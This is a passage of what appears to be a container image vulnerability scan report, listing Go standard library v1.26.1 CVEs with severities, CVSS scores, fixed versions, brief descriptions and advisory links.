│     │      │                  │         ╰ V3Score : 7.5 
│     │      │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                            ╰ V3Score : 7.5 
│     │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:14200 
│     │      │                  ├ [1] : https://access.redhat.com/security/cve/CVE-2026-32280 
│     │      │                  ├ [2] : https://bugzilla.redhat.com/2456336 
│     │      │                  ├ [3] : https://bugzilla.redhat.com/2456338 
│     │      │                  ├ [4] : https://bugzilla.redhat.com/2456339 
│     │      │                  ├ [5] : https://bugzilla.redhat.com/show_bug.cgi?id=2456336 
│     │      │                  ├ [6] : https://bugzilla.redhat.com/show_bug.cgi?id=2456338 
│     │      │                  ├ [7] : https://bugzilla.redhat.com/show_bug.cgi?id=2456339 
│     │      │                  ├ [8] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-32280 
│     │      │                  ├ [9] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-32282 
│     │      │                  ├ [10]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-32283 
│     │      │                  ├ [11]: https://errata.almalinux.org/9/ALSA-2026-14200.html 
│     │      │                  ├ [12]: https://errata.rockylinux.org/RLSA-2026:11514 
│     │      │                  ├ [13]: https://go.dev/cl/758320 
│     │      │                  ├ [14]: https://go.dev/issue/78282 
│     │      │                  ├ [15]: https://groups.google.com/g/golang-announce/c/0uYbvbPZRWU 
│     │      │                  ├ [16]: https://linux.oracle.com/cve/CVE-2026-32280.html 
│     │      │                  ├ [17]: https://linux.oracle.com/errata/ELSA-2026-14200.html 
│     │      │                  ├ [18]: https://nvd.nist.gov/vuln/detail/CVE-2026-32280 
│     │      │                  ├ [19]: https://pkg.go.dev/vuln/GO-2026-4947 
│     │      │                  ╰ [20]: https://www.cve.org/CVERecord?id=CVE-2026-32280 
│     │      ├ PublishedDate   : 2026-04-08T02:16:03.247Z 
│     │      ╰ LastModifiedDate: 2026-04-16T19:16:42.18Z 
│     ├ [12] ╭ VulnerabilityID : CVE-2026-32281 
│     │      ├ VendorIDs        ─ [0]: GO-2026-4946 
│     │      ├ PkgID           : stdlib@v1.26.1 
│     │      ├ PkgName         : stdlib 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.26.1 
│     │      │                  ╰ UID : ffd28a2ad639e9f9 
│     │      ├ InstalledVersion: v1.26.1 
│     │      ├ FixedVersion    : 1.25.9, 1.26.2 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ SeveritySource  : nvd 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-32281 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:2fc338a24c006b6ed2ed49ff3c33c9a43a444a04b6592a251a1c80363c2aa85b 
│     │      ├ Title           : crypto/x509: golang: Go crypto/x509: Denial of Service via inefficient
│     │      │                   certificate chain validation 
│     │      ├ Description     : Validating certificate chains which use policies is unexpectedly inefficient
│     │      │                   when certificates in the chain contain a very large number of policy mappings,
│     │      │                    possibly causing denial of service. This only affects validation of otherwise
│     │      │                    trusted certificate chains, issued by a root CA in the VerifyOptions.Roots
│     │      │                   CertPool, or in the system certificate pool. 
│     │      ├ Severity        : HIGH 
│     │      ├ CweIDs           ─ [0]: CWE-295 
│     │      ├ VendorSeverity   ╭ amazon : 3 
│     │      │                  ├ bitnami: 3 
│     │      │                  ├ nvd    : 3 
│     │      │                  ╰ redhat : 2 
│     │      ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                  │         ╰ V3Score : 7.5 
│     │      │                  ├ nvd     ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                  │         ╰ V3Score : 7.5 
│     │      │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                            ╰ V3Score : 5.9 
│     │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-32281 
│     │      │                  ├ [1]: https://go.dev/cl/758061 
│     │      │                  ├ [2]: https://go.dev/issue/78281 
│     │      │                  ├ [3]: https://groups.google.com/g/golang-announce/c/0uYbvbPZRWU 
│     │      │                  ├ [4]: https://nvd.nist.gov/vuln/detail/CVE-2026-32281 
│     │      │                  ├ [5]: https://pkg.go.dev/vuln/GO-2026-4946 
│     │      │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-32281 
│     │      ├ PublishedDate   : 2026-04-08T02:16:03.35Z 
│     │      ╰ LastModifiedDate: 2026-04-16T19:15:57.75Z 
│     ├ [13] ╭ VulnerabilityID : CVE-2026-32283 
│     │      ├ VendorIDs        ─ [0]: GO-2026-4870 
│     │      ├ PkgID           : stdlib@v1.26.1 
│     │      ├ PkgName         : stdlib 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.26.1 
│     │      │                  ╰ UID : ffd28a2ad639e9f9 
│     │      ├ InstalledVersion: v1.26.1 
│     │      ├ FixedVersion    : 1.25.9, 1.26.2 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ SeveritySource  : nvd 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-32283 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:101f98f6eba3ce6c707cc2d55aedeb9e25376a103c9d67fc8632f1e3ee4773c5 
│     │      ├ Title           : crypto/tls: golang: Go crypto/tls: Denial of Service via multiple TLS 1.3 key
│     │      │                   update messages 
│     │      ├ Description     : If one side of the TLS connection sends multiple key update messages
│     │      │                   post-handshake in a single record, the connection can deadlock, causing
│     │      │                   uncontrolled consumption of resources. This can lead to a denial of service.
│     │      │                   This only affects TLS 1.3. 
│     │      ├ Severity        : HIGH 
│     │      ├ CweIDs           ─ [0]: CWE-770 
│     │      ├ VendorSeverity   ╭ alma       : 3 
│     │      │                  ├ amazon     : 3 
│     │      │                  ├ bitnami    : 3 
│     │      │                  ├ nvd        : 3 
│     │      │                  ├ oracle-oval: 3 
│     │      │                  ├ redhat     : 3 
│     │      │                  ╰ rocky      : 3 
│     │      ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                  │         ╰ V3Score : 7.5 
│     │      │                  ├ nvd     ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                  │         ╰ V3Score : 7.5 
│     │      │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                            ╰ V3Score : 7.5 
│     │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:14200 
│     │      │                  ├ [1] : https://access.redhat.com/security/cve/CVE-2026-32283 
│     │      │                  ├ [2] : https://bugzilla.redhat.com/2456336 
│     │      │                  ├ [3] : https://bugzilla.redhat.com/2456338 
│     │      │                  ├ [4] : https://bugzilla.redhat.com/2456339 
│     │      │                  ├ [5] : https://bugzilla.redhat.com/show_bug.cgi?id=2456336 
│     │      │                  ├ [6] : https://bugzilla.redhat.com/show_bug.cgi?id=2456338 
│     │      │                  ├ [7] : https://bugzilla.redhat.com/show_bug.cgi?id=2456339 
│     │      │                  ├ [8] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-32280 
│     │      │                  ├ [9] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-32282 
│     │      │                  ├ [10]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-32283 
│     │      │                  ├ [11]: https://errata.almalinux.org/9/ALSA-2026-14200.html 
│     │      │                  ├ [12]: https://errata.rockylinux.org/RLSA-2026:11514 
│     │      │                  ├ [13]: https://go.dev/cl/763767 
│     │      │                  ├ [14]: https://go.dev/issue/78334 
│     │      │                  ├ [15]: https://groups.google.com/g/golang-announce/c/0uYbvbPZRWU 
│     │      │                  ├ [16]: https://linux.oracle.com/cve/CVE-2026-32283.html 
│     │      │                  ├ [17]: https://linux.oracle.com/errata/ELSA-2026-14200.html 
│     │      │                  ├ [18]: https://nvd.nist.gov/vuln/detail/CVE-2026-32283 
│     │      │                  ├ [19]: https://pkg.go.dev/vuln/GO-2026-4870 
│     │      │                  ╰ [20]: https://www.cve.org/CVERecord?id=CVE-2026-32283 
│     │      ├ PublishedDate   : 2026-04-08T02:16:03.58Z 
│     │      ╰ LastModifiedDate: 2026-04-16T19:12:10.54Z 
│     ├ [14] ╭ VulnerabilityID : CVE-2026-33810 
│     │      ├ VendorIDs        ─ [0]: GO-2026-4866 
│     │      ├ PkgID           : stdlib@v1.26.1 
│     │      ├ PkgName         : stdlib 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.26.1 
│     │      │                  ╰ UID : ffd28a2ad639e9f9 
│     │      ├ InstalledVersion: v1.26.1 
│     │      ├ FixedVersion    : 1.26.2 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ SeveritySource  : nvd 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-33810 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:f3917573d9af7f185d6a2294ab82418d0d2ead0c33d6f3a0cc9354aeb4e70fca 
│     │      ├ Title           : crypto/x509: golang: Go crypto/x509: Certificate validation bypass due to
│     │      │                   incorrect DNS constraint application 
│     │      ├ Description     : When verifying a certificate chain containing excluded DNS constraints, these
│     │      │                   constraints are not correctly applied to wildcard DNS SANs which use a
│     │      │                   different case than the constraint. This only affects validation of otherwise
│     │      │                   trusted certificate chains, issued by a root CA in the VerifyOptions.Roots
│     │      │                   CertPool, or in the system certificate pool. 
│     │      ├ Severity        : HIGH 
│     │      ├ CweIDs           ─ [0]: CWE-295 
│     │      ├ VendorSeverity   ╭ azure  : 2 
│     │      │                  ├ bitnami: 3 
│     │      │                  ├ nvd    : 3 
│     │      │                  ╰ redhat : 3 
│     │      ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N 
│     │      │                  │         ╰ V3Score : 8.2 
│     │      │                  ├ nvd     ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N 
│     │      │                  │         ╰ V3Score : 8.2 
│     │      │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:L 
│     │      │                            ╰ V3Score : 8.8 
│     │      ├ References       ╭ [0]: http://www.openwall.com/lists/oss-security/2026/04/19/4 
│     │      │                  ├ [1]: http://www.openwall.com/lists/oss-security/2026/04/20/1 
│     │      │                  ├ [2]: https://access.redhat.com/security/cve/CVE-2026-33810 
│     │      │                  ├ [3]: https://go.dev/cl/763763 
│     │      │                  ├ [4]: https://go.dev/issue/78332 
│     │      │                  ├ [5]: https://groups.google.com/g/golang-announce/c/0uYbvbPZRWU 
│     │      │                  ├ [6]: https://nvd.nist.gov/vuln/detail/CVE-2026-33810 
│     │      │                  ├ [7]: https://pkg.go.dev/vuln/GO-2026-4866 
│     │      │                  ╰ [8]: https://www.cve.org/CVERecord?id=CVE-2026-33810 
│     │      ├ PublishedDate   : 2026-04-08T02:16:03.95Z 
│     │      ╰ LastModifiedDate: 2026-04-20T18:16:26.813Z 
│     ├ [15] ╭ VulnerabilityID : CVE-2026-32282 
│     │      ├ VendorIDs        ─ [0]: GO-2026-4864 
│     │      ├ PkgID           : stdlib@v1.26.1 
│     │      ├ PkgName         : stdlib 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.26.1 
│     │      │                  ╰ UID : ffd28a2ad639e9f9 
│     │      ├ InstalledVersion: v1.26.1 
│     │      ├ FixedVersion    : 1.25.9, 1.26.2 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ SeveritySource  : nvd 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-32282 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:14ce712c908e178dbfdd812771ef16420330558123379a47022d6120ee7dc876 
│     │      ├ Title           : golang: internal/syscall/unix: Root.Chmod can follow symlinks out of the root 
│     │      ├ Description     : On Linux, if the target of Root.Chmod is replaced with a symlink while the
│     │      │                   chmod operation is in progress, Chmod can operate on the target of the
│     │      │                   symlink, even when the target lies outside the root. The Linux fchmodat
│     │      │                   syscall silently ignores the AT_SYMLINK_NOFOLLOW flag, which Root.Chmod uses
│     │      │                   to avoid symlink traversal. Root.Chmod checks its target before acting and
│     │      │                   returns an error if the target is a symlink lying outside the root, so the
│     │      │                   impact is limited to cases where the target is replaced with a symlink between
│     │      │                    the check and operation. 
│     │      ├ Severity        : MEDIUM 
│     │      ├ CweIDs           ─ [0]: CWE-59 
│     │      ├ VendorSeverity   ╭ alma       : 3 
│     │      │                  ├ amazon     : 3 
│     │      │                  ├ bitnami    : 2 
│     │      │                  ├ nvd        : 2 
│     │      │                  ├ oracle-oval: 3 
│     │      │                  ├ redhat     : 2 
│     │      │                  ╰ rocky      : 3 
│     │      ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:L/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:H 
│     │      │                  │         ╰ V3Score : 6.4 
│     │      │                  ├ nvd     ╭ V3Vector: CVSS:3.1/AV:L/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:H 
│     │      │                  │         ╰ V3Score : 6.4 
│     │      │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H 
│     │      │                            ╰ V3Score : 7.8 
│     │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:14200 
│     │      │                  ├ [1] : https://access.redhat.com/security/cve/CVE-2026-32282 
│     │      │                  ├ [2] : https://bugzilla.redhat.com/2456336 
│     │      │                  ├ [3] : https://bugzilla.redhat.com/2456338 
│     │      │                  ├ [4] : https://bugzilla.redhat.com/2456339 
│     │      │                  ├ [5] : https://bugzilla.redhat.com/show_bug.cgi?id=2456336 
│     │      │                  ├ [6] : https://bugzilla.redhat.com/show_bug.cgi?id=2456338 
│     │      │                  ├ [7] : https://bugzilla.redhat.com/show_bug.cgi?id=2456339 
│     │      │                  ├ [8] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-32280 
│     │      │                  ├ [9] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-32282 
│     │      │                  ├ [10]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-32283 
│     │      │                  ├ [11]: https://errata.almalinux.org/9/ALSA-2026-14200.html 
│     │      │                  ├ [12]: https://errata.rockylinux.org/RLSA-2026:11514 
│     │      │                  ├ [13]: https://go.dev/cl/763761 
│     │      │                  ├ [14]: https://go.dev/issue/78293 
│     │      │                  ├ [15]: https://groups.google.com/g/golang-announce/c/0uYbvbPZRWU 
│     │      │                  ├ [16]: https://linux.oracle.com/cve/CVE-2026-32282.html 
│     │      │                  ├ [17]: https://linux.oracle.com/errata/ELSA-2026-14200.html 
│     │      │                  ├ [18]: https://nvd.nist.gov/vuln/detail/CVE-2026-32282 
│     │      │                  ├ [19]: https://pkg.go.dev/vuln/GO-2026-4864 
│     │      │                  ╰ [20]: https://www.cve.org/CVERecord?id=CVE-2026-32282 
│     │      ├ PublishedDate   : 2026-04-08T02:16:03.467Z 
│     │      ╰ LastModifiedDate: 2026-04-16T19:15:39.4Z 
│     ├ [16] ╭ VulnerabilityID : CVE-2026-32288 
│     │      ├ VendorIDs        ─ [0]: GO-2026-4869 
│     │      ├ PkgID           : stdlib@v1.26.1 
│     │      ├ PkgName         : stdlib 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.26.1 
│     │      │                  ╰ UID : ffd28a2ad639e9f9 
│     │      ├ InstalledVersion: v1.26.1 
│     │      ├ FixedVersion    : 1.25.9, 1.26.2 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ SeveritySource  : nvd 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-32288 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:7c52de16ab94f69daca7fd2ac8ebf864ea5c3fb3f66fe6f0984f005e9f627441 
│     │      ├ Title           : archive/tar: golang: Go's archive/tar package: Denial of Service via
│     │      │                   maliciously-crafted archive 
│     │      ├ Description     : tar.Reader can allocate an unbounded amount of memory when reading a
│     │      │                   maliciously-crafted archive containing a large number of sparse regions
│     │      │                   encoded in the "old GNU sparse map" format. 
│     │      ├ Severity        : MEDIUM 
│     │      ├ CweIDs           ─ [0]: CWE-770 
│     │      ├ VendorSeverity   ╭ amazon : 3 
│     │      │                  ├ azure  : 2 
│     │      │                  ├ bitnami: 2 
│     │      │                  ├ nvd    : 2 
│     │      │                  ├ photon : 3 
│     │      │                  ╰ redhat : 2 
│     │      ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H 
│     │      │                  │         ╰ V3Score : 5.5 
│     │      │                  ├ nvd     ╭ V3Vector: CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H 
│     │      │                  │         ╰ V3Score : 5.5 
│     │      │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:L 
│     │      │                            ╰ V3Score : 4.3 
│     │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-32288 
│     │      │                  ├ [1]: https://go.dev/cl/763766 
│     │      │                  ├ [2]: https://go.dev/issue/78301 
│     │      │                  ├ [3]: https://groups.google.com/g/golang-announce/c/0uYbvbPZRWU 
│     │      │                  ├ [4]: https://nvd.nist.gov/vuln/detail/CVE-2026-32288 
│     │      │                  ├ [5]: https://pkg.go.dev/vuln/GO-2026-4869 
│     │      │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-32288 
│     │      ├ PublishedDate   : 2026-04-08T02:16:03.707Z 
│     │      ╰ LastModifiedDate: 2026-04-16T19:08:52.24Z 
│     ├ [17] ╭ VulnerabilityID : CVE-2026-32289 
│     │      ├ VendorIDs        ─ [0]: GO-2026-4865 
│     │      ├ PkgID           : stdlib@v1.26.1 
│     │      ├ PkgName         : stdlib 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.26.1 
│     │      │                  ╰ UID : ffd28a2ad639e9f9 
│     │      ├ InstalledVersion: v1.26.1 
│     │      ├ FixedVersion    : 1.25.9, 1.26.2 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ SeveritySource  : nvd 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-32289 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:af18313c2228e4ee4859f8fa34ea46ebee03250fdfab40c223189c110e644e8d 
│     │      ├ Title           : html/template: golang: html/template: Cross-Site Scripting (XSS) via improper
│     │      │                   context and brace depth tracking in JS template literals 
│     │      ├ Description     : Context was not properly tracked across template branches for JS template
│     │      │                   literals, leading to possibly incorrect escaping of content when branches were
│     │      │                    used. Additionally template actions within JS template literals did not
│     │      │                   properly track the brace depth, leading to incorrect escaping being applied.
│     │      │                   These issues could cause actions within JS template literals to be incorrectly
│     │      │                    or improperly escaped, leading to XSS vulnerabilities. 
│     │      ├ Severity        : MEDIUM 
│     │      ├ CweIDs           ─ [0]: CWE-79 
│     │      ├ VendorSeverity   ╭ amazon : 3 
│     │      │                  ├ bitnami: 2 
│     │      │                  ├ nvd    : 2 
│     │      │                  ├ photon : 4 
│     │      │                  ╰ redhat : 2 
│     │      ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N 
│     │      │                  │         ╰ V3Score : 6.1 
│     │      │                  ├ nvd     ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N 
│     │      │                  │         ╰ V3Score : 6.1 
│     │      │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N 
│     │      │                            ╰ V3Score : 5.4 
│     │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-32289 
│     │      │                  ├ [1]: https://go.dev/cl/763762 
│     │      │                  ├ [2]: https://go.dev/issue/78331 
│     │      │                  ├ [3]: https://groups.google.com/g/golang-announce/c/0uYbvbPZRWU 
│     │      │                  ├ [4]: https://nvd.nist.gov/vuln/detail/CVE-2026-32289 
│     │      │                  ├ [5]: https://pkg.go.dev/vuln/GO-2026-4865 
│     │      │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-32289 
│     │      ├ PublishedDate   : 2026-04-08T02:16:03.82Z 
│     │      ╰ LastModifiedDate: 2026-04-16T19:06:57.367Z 
│     ├ [18] ╭ VulnerabilityID : CVE-2026-33811 
│     │      ├ VendorIDs        ─ [0]: GO-2026-4981 
│     │      ├ PkgID           : stdlib@v1.26.1 
│     │      ├ PkgName         : stdlib 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.26.1 
│     │      │                  ╰ UID : ffd28a2ad639e9f9 
│     │      ├ InstalledVersion: v1.26.1 
│     │      ├ FixedVersion    : 1.25.10, 1.26.3 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-33811 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:be065754dd5d378b1d4b074eba815eb11796ddbe9a790594886c948864babf47 
│     │      ├ Title           : When using LookupCNAME with the cgo DNS resolver, a very long CNAME re ... 
│     │      ├ Description     : When using LookupCNAME with the cgo DNS resolver, a very long CNAME response
│     │      │                   can trigger a double-free of C memory and a crash. 
│     │      ├ Severity        : UNKNOWN 
│     │      ├ References       ╭ [0]: https://go.dev/cl/767860 
│     │      │                  ├ [1]: https://go.dev/issue/78803 
│     │      │                  ├ [2]: https://groups.google.com/g/golang-announce/c/qcCIEXso47M 
│     │      │                  ╰ [3]: https://pkg.go.dev/vuln/GO-2026-4981 
│     │      ├ PublishedDate   : 2026-05-07T20:16:42.77Z 
│     │      ╰ LastModifiedDate: 2026-05-08T15:16:36.64Z 
│     ├ [19] ╭ VulnerabilityID : CVE-2026-33814 
│     │      ├ VendorIDs        ─ [0]: GO-2026-4918 
│     │      ├ PkgID           : stdlib@v1.26.1 
│     │      ├ PkgName         : stdlib 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.26.1 
│     │      │                  ╰ UID : ffd28a2ad639e9f9 
│     │      ├ InstalledVersion: v1.26.1 
│     │      ├ FixedVersion    : 1.25.10, 1.26.3 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-33814 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:88120a3592a0a3b048e4c457818596ab3a82e44cb6fe00efcd0b91e4a98a382b 
│     │      ├ Title           : When processing HTTP/2 SETTINGS frames, transport will enter an infini ... 
│     │      ├ Description     : When processing HTTP/2 SETTINGS frames, transport will enter an infinite loop
│     │      │                   of writing CONTINUATION frames if it receives a SETTINGS_MAX_FRAME_SIZE with a
│     │      │                    value of 0. 
│     │      ├ Severity        : UNKNOWN 
│     │      ├ References       ╭ [0]: https://go.dev/cl/761581 
│     │      │                  ├ [1]: https://go.dev/cl/761640 
│     │      │                  ├ [2]: https://go.dev/issue/78476 
│     │      │                  ├ [3]: https://groups.google.com/g/golang-announce/c/qcCIEXso47M 
│     │      │                  ╰ [4]: https://pkg.go.dev/vuln/GO-2026-4918 
│     │      ├ PublishedDate   : 2026-05-07T20:16:42.88Z 
│     │      ╰ LastModifiedDate: 2026-05-08T19:16:30.567Z 
│     ├ [20] ╭ VulnerabilityID : CVE-2026-39820 
│     │      ├ VendorIDs        ─ [0]: GO-2026-4986 
│     │      ├ PkgID           : stdlib@v1.26.1 
│     │      ├ PkgName         : stdlib 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.26.1 
│     │      │                  ╰ UID : ffd28a2ad639e9f9 
│     │      ├ InstalledVersion: v1.26.1 
│     │      ├ FixedVersion    : 1.25.10, 1.26.3 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39820 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:617334dd8c4dcdb2561ac43ff1a9fd055dd44912140e54ecb3104e94a26a2b5a 
│     │      ├ Title           : Well-crafted inputs reaching ParseAddress, ParseAddressList, and Parse ... 
│     │      ├ Description     : Well-crafted inputs reaching ParseAddress, ParseAddressList, and ParseDate
│     │      │                   were able to trigger excessive CPU exhaustion and memory allocations. 
│     │      ├ Severity        : UNKNOWN 
│     │      ├ References       ╭ [0]: https://go.dev/cl/759940 
│     │      │                  ├ [1]: https://go.dev/issue/78566 
│     │      │                  ├ [2]: https://groups.google.com/g/golang-announce/c/qcCIEXso47M 
│     │      │                  ╰ [3]: https://pkg.go.dev/vuln/GO-2026-4986 
│     │      ├ PublishedDate   : 2026-05-07T20:16:43.187Z 
│     │      ╰ LastModifiedDate: 2026-05-08T15:16:37.323Z 
│     ├ [21] ╭ VulnerabilityID : CVE-2026-39823 
│     │      ├ VendorIDs        ─ [0]: GO-2026-4982 
│     │      ├ PkgID           : stdlib@v1.26.1 
│     │      ├ PkgName         : stdlib 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.26.1 
│     │      │                  ╰ UID : ffd28a2ad639e9f9 
│     │      ├ InstalledVersion: v1.26.1 
│     │      ├ FixedVersion    : 1.25.10, 1.26.3 
│     │      ├ Status          : fixed 
